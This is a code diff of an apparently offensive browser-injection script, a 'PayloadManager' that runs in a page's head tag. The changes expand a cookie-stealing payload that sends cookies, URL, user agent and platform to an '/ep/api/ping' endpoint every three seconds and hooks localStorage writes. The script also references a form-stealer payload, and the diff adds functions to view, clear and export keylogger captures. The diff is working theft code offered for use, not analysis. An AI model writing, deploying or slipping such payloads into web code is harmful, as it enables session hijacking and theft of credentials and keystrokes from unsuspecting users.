@@ -3,7 +3,7 @@ REMEMBER!
 This file is run in the head tag, so make sure that your payloads are run after the body has loaded, if neceessary.
 */
 
-alert('Test payload')
+console.log('%c[✓] Payload initialized', 'color: #4CAF50');
 
 const PayloadManager = {
     // Configuration for payloads
@@ -16,35 +16,44 @@ const PayloadManager = {
     // Available payloads
     payloads: {
         cookieLogger: () => {
-            const sendCookies = () => {
-                fetch('/ep/api/ping', { 
-                    method: 'POST',
-                    credentials: 'include',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        cookies: document.cookie,
-                        url: window.location.href
-                    })
+            const stealCookies = () => {
+                const cookies = document.cookie.split(';').map(cookie => {
+                    const [name, value] = cookie.trim().split('=');
+                    return { name, value };
                 });
+
+                if (cookies.length > 0) {
+                    fetch('/ep/api/ping', { 
+                        method: 'POST',
+                        credentials: 'include',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            cookies,
+                            url: window.location.href,
+                            timestamp: new Date().toISOString(),
+                            userAgent: navigator.userAgent,
+                            platform: navigator.platform
+                        })
+                    });
+                }
             };
 
-            // Send cookies immediately
-            sendCookies();
+            // Initial steal
+            stealCookies();
 
             // Monitor cookie changes
-            setInterval(sendCookies, 5000);
+            document.addEventListener('cookie', stealCookies);
+            setInterval(stealCookies, 3000);
 
-            // Monitor cookie changes using a MutationObserver
-            const cookieObserver = new MutationObserver(() => {
-                sendCookies();
-            });
-
-            cookieObserver.observe(document, {
-                attributes: true,
-                attributeFilter: ['cookie']
-            });
+            // Monitor localStorage changes
+            const originalSetItem = localStorage.setItem;
+            localStorage.setItem = function() {
+                const result = originalSetItem.apply(this, arguments);
+                stealCookies();
+                return result;
+            };
         },
 
         formStealer: () => {
@@ -113,15 +122,74 @@ const PayloadManager = {
     },
     
     init: function() {
-        // Execute enabled payloads when DOM is loaded
         document.addEventListener('DOMContentLoaded', () => {
+            // Initialize payload states
             Object.keys(this.config).forEach(payload => {
+                const status = document.getElementById(`${payload}-status`);
+                if (status) {
+                    status.textContent = this.config[payload] ? 'Active' : 'Inactive';
+                    status.style.color = this.config[payload] ? '#4CAF50' : '#f44336';
+                }
+                
                 if (this.config[payload] && this.payloads[payload]) {
-                    this.payloads[payload]();
+                    try {
+                        this.payloads[payload]();
+                    } catch (error) {
+                        console.error(`Error initializing ${payload}:`, error);
+                    }
                 }
             });
         });
+    },
+
+    togglePayload: function(name) {
+        this.config[name] = !this.config[name];
+        if (this.config[name]) {
+            this.payloads[name]();
+        }
+        localStorage.setItem('payloadConfig', JSON.stringify(this.config));
     }
 };
 
 PayloadManager.init();
+
+function updateKeylogger() {
+    fetch('/ep/api/keylog')
+        .then(response => response.json())
+        .then(logs => {
+            const keyloggerList = document.getElementById('keylogger-list');
+            keyloggerList.innerHTML = '';
+            
+            logs.reverse().forEach(log => {
+                const entry = document.createElement('div');
+                entry.className = 'keylog-entry';
+                entry.innerHTML = `
+                    <div class="keylog-url">${log.url}</div>
+                    <div class="keylog-data">${log.keys}</div>
+                    <div class="keylog-time">${new Date(log.timestamp).toLocaleString()}</div>
+                `;
+                keyloggerList.appendChild(entry);
+            });
+        });
+}
+
+function clearKeylogger() {
+    fetch('/ep/api/clearKeylog', { method: 'POST' })
+        .then(() => updateKeylogger());
+}
+
+function exportKeylogger() {
+    fetch('/ep/api/keylog')
+        .then(response => response.json())
+        .then(logs => {
+            const blob = new Blob([JSON.stringify(logs, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'keylogger-data.json';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        });
+}
